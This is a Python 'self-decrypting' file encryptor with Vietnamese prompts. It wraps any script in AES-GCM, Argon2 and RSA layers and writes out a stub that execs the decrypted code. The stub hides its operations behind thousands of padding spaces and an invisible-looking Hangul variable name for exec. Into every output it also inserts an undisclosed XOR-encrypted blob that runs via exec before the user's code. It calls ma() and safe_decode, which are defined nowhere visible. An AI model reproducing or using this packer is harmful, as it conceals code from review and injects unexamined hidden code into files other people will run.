import os, sys, json, base64, marshal
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Signature import pss
from Crypto.Hash import SHA512
from Crypto.Random import get_random_bytes
from argon2.low_level import hash_secret_raw, Type

while True:
    input_file = input("Nhập tên file cần mã hóa: ").strip()
    if os.path.isfile(input_file):
        break
    print("File không tồn tại. Vui lòng thử lại.")

output_file = input("Nhập tên file mã hóa: ").strip()

with open(input_file, "rb") as f:
    mad = f.read()

# Sinh khóa AES và thông số
key = get_random_bytes(32)
nonce = get_random_bytes(12)
salt = get_random_bytes(16)

wnn = AES.new(key, AES.MODE_GCM, nonce=nonce)
dma, tag = wnn.encrypt_and_digest(mad)

# Dùng password tự sinh từ nonce+salt
jndk = base64.b64encode(nonce + salt)
protected_key = hash_secret_raw(
    secret=jndk,
    salt=salt,
    time_cost=4,
    memory_cost=102400,
    parallelism=8,
    hash_len=32,
    type=Type.ID
)
mas = bytes(a ^ b for a, b in zip(key, protected_key))

# Tạo RSA key
rsa_key = RSA.generate(2048)
public_key_pem = rsa_key.publickey().export_key()

# Ký checksum
h = SHA512.new(dma + tag + mas)
signature = pss.new(rsa_key).sign(h)

# Bọc data bằng marshal
raw_json = json.dumps({
    "dma": base64.b64encode(dma).decode(),
    "tag": base64.b64encode(tag).decode(),
    "mas": base64.b64encode(mas).decode(),
    "salt": base64.b64encode(salt).decode(),
    "nonce": base64.b64encode(nonce).decode(),
    "signature": base64.b64encode(signature).decode(),
    "public_key": public_key_pem.decode()
})

data_encoded = base64.b64encode(marshal.dumps(raw_json.encode())).decode()

junidokai = f'''
import base64, marshal, json, traceback
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Signature import pss
from Crypto.Hash import SHA512
from argon2.low_level import hash_secret_raw, Type

def max(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def dek(masked_key_b64, error):
    masked_key = base64.b64decode(masked_key_b64)
    return max(masked_key, error.encode())

encrypted {'  '*9999}= base64.b64decode('QFJTj+zUSFSP6NlRSI3nw1JTj+zUSFSP6NlRSFJTgebOUFiW/MlQXJvl1VJTgebOUFiW/MlQXJvl1VJTQGJkTiYbBRAfCB4EAU8MGk8kGAsdEQYmABBhf0w4Bh0dBAoaVVNNU1deW1tjaUw+FBEcGgdNUlddR09jaUxeWkpGQkZfUUtZVV9fWVxXV1FBVS4gNVJcQlVeU2JkTiuVz9YYQR0JFgAKBk8YGAxUGarfDx5Msf6P2OxOAYTO1ABNAhYBGAoAF08ArsUNeGNOXESO/M9TXo3nzVhJl+DNXESO/M9TXo3nzVhJl+DNXESO/M9TXo3nzVhJl+DNXESO/M9TXo3nzVhJl+DNXERPeGVNXlKM5MVJSD0Fp8lMIwaP2OgAUFiW/MlQXFphfwYDEwAcGUUGEBgYBAoYBkNODBxCTRYNBkVNEhYPHgoabmUIHwoZVR0EDBxMHAIeDB0aTRYYEAwdbHNPSFKM6s9TUDYbABsOBERRl+bOXlJNYG8QEA9NDBgFG0dHWWJkZBAGGUlQQQsJBBoLEBsdQwIRAUFPCQ0YBRxUTEAcDBJaEgAZCQwOABwLEQwBAxERGx1DAhYBWgIPDQcdDhAAHEY+BAsaEB1BDg4HA0oTHB0ZTwkVV0ZjaWYLFQAXXRwfDVcYEBcaT08JAQoWFAUeSVBFeGUDAgYARUw=')
error {'  '*9999}= 'khonggiaiduockeydau'
key {'  '*9999}= dek('CAcBAwITHAgEBQwDFgQL', error)
ERROR {'  '*9999}= max(encrypted, key)
exec(ERROR.decode("utf-8"))


data {'  '*999999}= json.loads(marshal.loads(base64.b64decode("{data_encoded}")).decode())

jndk {'  '*9999}= base64.b64encode(
    base64.b64decode(data["nonce"]) + base64.b64decode(data["salt"])
)

protected_key {'  '*9999}= hash_secret_raw(
    secret{'  '*9999}=jndk,
    salt{'  '*9999}=base64.b64decode(data["salt"]),
    time_cost{'  '*9999}=4,
    memory_cost{'  '*9999}=102400,
    parallelism{'  '*9999}=8,
    hash_len{'  '*9999}=32,
    type{'  '*9999}=Type.ID
)

mas {'  '*9999}= base64.b64decode(data["mas"])
key {'  '*9999}= bytes(a ^ b for a, b in zip(mas, protected_key))
dma {'  '*9999}= base64.b64decode(data["dma"])
tag {'  '*9999}= base64.b64decode(data["tag"])
h {'  '*9999}= SHA512.new(dma + tag + mas)
verifier {'  '*9999}= pss.new(RSA.import_key(data["public_key"]))

try:
    verifier.verify(h, base64.b64decode(data["signature"]))
except (ValueError, TypeError):
    ma()

wnn {'  '*9999}= AES.new(key, AES.MODE_GCM, nonce=base64.b64decode(data["nonce"]))
mad {'  '*9999}= wnn.decrypt_and_verify(dma, tag)
ᅠ {'  '*9999}= "exec"
eval(globals()["ᅠ"]){'  '*9999}(safe_decode(bytes(mad)))
'''

# Ghi ra file output
with open(output_file, "w") as f:
    f.write(junidokai)

print(f"✅ Đã tạo file mã hóa tự giải mã: {output_file}")